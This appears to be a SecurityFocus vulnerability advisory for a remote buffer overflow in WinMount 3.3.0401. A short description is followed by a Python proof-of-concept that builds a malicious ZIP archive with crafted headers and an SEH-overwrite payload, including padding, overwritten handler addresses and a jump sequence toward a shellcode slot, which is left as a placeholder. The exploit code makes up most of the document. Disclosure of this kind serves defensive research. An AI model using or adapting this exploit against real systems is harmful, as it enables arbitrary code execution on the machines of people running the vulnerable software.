source: http://www.securityfocus.com/bid/39557/info

WinMount is prone to a remote buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.

An attacker can exploit this issue to execute arbitrary code with the privileges of the user running the affected application. Failed exploit attempts will result in a denial-of-service condition.

WinMount 3.3.0401 is vulnerable; other versions may be affected. 

import os

sploitfile="test.zip"
ldf_header =('\x50\x4B\x03\x04\x14\x00\x00'
'\x00\x08\x00\xB7\xAC\xCE\x34\x00\x00\x00'
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
'\xd0\xff'
'\x00\x00\x00')
cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14"
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xd0\xff"
"\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")
eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00"
"\x00\x01\x00\x01\x00"
"\xfe\xff\x00\x00"
"\xee\xff\x00\x00"
"\x00\x00")
print "[+] Preparing payload\n"
size=65484
junk='A'*420
nseh='\x89\x8a\x8b\x8c'
seh='\x84\x5b\xac\x8d'
junk_='A'*33
jumpto='\x05\x12\x11\x46\x2d\x11\x11\x46\x50\x46\xac\xe4'#make eax point to shellcode and jump to shellcode
shellcode=("the shellcode here will be changed into unicode")#encode by alpha2
junk__='B'*80
last='C'*(size-420-len(nseh+seh+junk_+jumpto+junk__+shellcode))
payload=junk+nseh+seh+junk_+jumpto+junk__+shellcode+last+".wav"
evilzip = ldf_header+payload+cdf_header+payload+eofcdf_header
print "[+] Removing old zip file\n"
os.system("del "+sploitfile)
print "[+] Writing payload to file\n"
fobj=open(sploitfile,"w",0)
fobj.write(evilzip)
print "generate zip file "+(sploitfile)
fobj.close()
print '[+] Wrote %d bytes to file sploitfile\n'%(len(evilzip))
print "[+] Payload length :%d \n"%(len(payload))

